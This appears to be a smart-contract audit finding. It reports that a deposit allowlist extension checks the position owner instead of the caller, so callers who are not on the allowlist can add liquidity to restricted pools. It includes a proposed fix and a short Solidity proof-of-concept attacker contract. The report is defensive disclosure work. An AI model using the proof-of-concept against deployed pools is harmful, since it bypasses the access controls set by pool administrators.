### Title
Deposit Allowlist Checks `owner` Instead of `sender`, Allowing Non-Allowlisted Callers to Bypass the Guard — (`metric-periphery/contracts/extensions/DepositAllowlistExtension.sol`)

### Summary
`DepositAllowlistExtension.beforeAddLiquidity` gates on the position `owner` argument rather than the `sender` (the actual caller of `addLiquidity`). Any smart-contract address that is not on the allowlist can call `pool.addLiquidity` directly, supply an allowlisted address as `owner`, implement `metricOmmModifyLiquidityCallback` to pay the tokens, and the extension check passes — bypassing the pool admin's deposit restriction entirely.

### Finding Description
`MetricOmmPool.addLiquidity` fires the `beforeAddLiquidity` hook with two actor addresses:

```
_beforeAddLiquidity(msg.sender /*sender*/, owner /*position owner*/, ...)
``` [1](#0-0) 

`ExtensionCalling._beforeAddLiquidity` encodes both and forwards them to the extension:

```
abi.encodeCall(IMetricOmmExtensions.beforeAddLiquidity, (sender, owner, salt, deltas, extensionData))
``` [2](#0-1) 

`DepositAllowlistExtension.beforeAddLiquidity` silently discards `sender` (first parameter is unnamed) and checks only `owner`:

```solidity
function beforeAddLiquidity(address, address owner, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][owner]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    ...
}
``` [3](#0-2) 

Compare with `SwapAllowlistExtension.beforeSwap`, which correctly checks `sender` (the actual swapper) and ignores `recipient`:

```solidity
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    ...
}
``` [4](#0-3) 

The inconsistency is the root cause: the deposit guard checks the wrong actor.

### Impact Explanation
A non-allowlisted smart contract can:
1. Call `pool.addLiquidity(allowlistedAddress, salt, deltas, callbackData, extensionData)` directly.
2. Implement `metricOmmModifyLiquidityCallback` to pull and pay the required tokens.
3. The extension evaluates `allowedDepositor[pool][allowlistedAddress]` → `true` → no revert.
4. The non-allowlisted address's tokens enter the pool; the allowlisted address receives LP shares it did not request.

The pool admin's deposit restriction — the sole on-chain mechanism to control who may add liquidity — is fully bypassed. This is an **admin-boundary break**: a factory/pool-admin-configured access control is circumvented by an unprivileged path. Additionally, the attacker can manipulate pool bin state (add liquidity to specific bins to skew the cursor position and affect subsequent swap pricing) without being on the allowlist. [5](#0-4) 

### Likelihood Explanation
- Requires the attacker to be a smart contract (to implement the liquidity callback) — a standard capability.
- Requires knowledge of one allowlisted address — trivially discoverable from on-chain `AllowedToDepositSet` events.
- Requires the attacker to supply tokens — they voluntarily pay, so no external capital constraint beyond token balance.
- No privileged role, no special setup, no malicious pool assumption needed.

Likelihood: **Medium** (requires a contract caller and token capital, but no privileged access).

### Recommendation
Change `beforeAddLiquidity` to check `sender` (the first, currently unnamed parameter) instead of `owner`, mirroring the `SwapAllowlistExtension` pattern:

```solidity
function beforeAddLiquidity(address sender, address, uint80, LiquidityDelta calldata, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllDepositors[msg.sender] && !allowedDepositor[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToDeposit();
    }
    return IMetricOmmExtensions.beforeAddLiquidity.selector;
}
``` [3](#0-2) 

If the intended semantics are to gate by position owner (not caller), the `setAllowedToDeposit` NatSpec and the contract-level comment ("Gates `addLiquidity` by depositor address") must be updated to reflect that, and the bypass documented as accepted behavior.

### Proof of Concept

```solidity
// AttackerContract — not on the allowlist
contract Attacker is IMetricOmmModifyLiquidityCallback {
    IMetricOmmPool pool;
    IERC20 token0;
    IERC20 token1;
    address allowlistedOwner; // any address in allowedDepositor[pool]

    function attack(LiquidityDelta calldata deltas) external {
        // Approve pool to pull tokens via callback
        token0.approve(address(pool), type(uint256).max);
        token1.approve(address(pool), type(uint256).max);

        // sender = address(this) [NOT allowlisted]
        // owner  = allowlistedOwner [IS allowlisted]
        // DepositAllowlistExtension checks owner → passes
        pool.addLiquidity(allowlistedOwner, 0, deltas, abi.encode(uint8(1)), "");
    }

    function metricOmmModifyLiquidityCallback(
        uint256 amount0Delta, uint256 amount1Delta, bytes calldata
    ) external override {
        // Pay the pool — attacker's tokens enter the pool
        if (amount0Delta > 0) token0.transfer(msg.sender, amount0Delta);
        if (amount1Delta > 0) token1.transfer(msg.sender, amount1Delta);
    }
}
```

The call succeeds: `address(this)` (non-allowlisted) has deposited liquidity into a restricted pool, with the LP position recorded under `allowlistedOwner`. [3](#0-2) [6](#0-5)
